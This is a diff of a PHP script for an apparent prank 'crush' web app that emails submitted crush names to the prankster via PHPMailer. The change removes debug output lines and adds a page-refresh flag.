@@ -7,6 +7,7 @@ if($_POST['FoolName'] == '') {
 }
 include 'php-execute/connection.php';
 $url = $_POST['URL'];
+echo $refresh = 1;
 $stCrush = $_POST['1stCrush'];
 $ndCrush = $_POST['2ndCrush'];
 $rdCrush = $_POST['3rdCrush'];
@@ -25,14 +26,6 @@ if(mysqli_num_rows($result) > 0){
 }
 
 //send email begins	
-echo $FoolName;
-echo $stCrush;
-echo $ndCrush;
-echo $rdCrush;
-
-echo $YourEmail;
-echo $YourName;
-
 $SubFooled = "You have fooled ".$FoolName;
 
 require("php-execute/phpmailer/class.phpmailer.php");
@@ -47,7 +40,9 @@ $mail->Header='Content-type: text/html; charset=iso-8859-1';
 if(!$mail->Send())
 	echo "Error sending: ".$mail->ErrorInfo;
 else
-	echo 'email is sent!';
+	//echo 'email is sent!';
+	$refresh = 1;
+	
 //send email ends
 ?>
 <!DOCTYPE html>
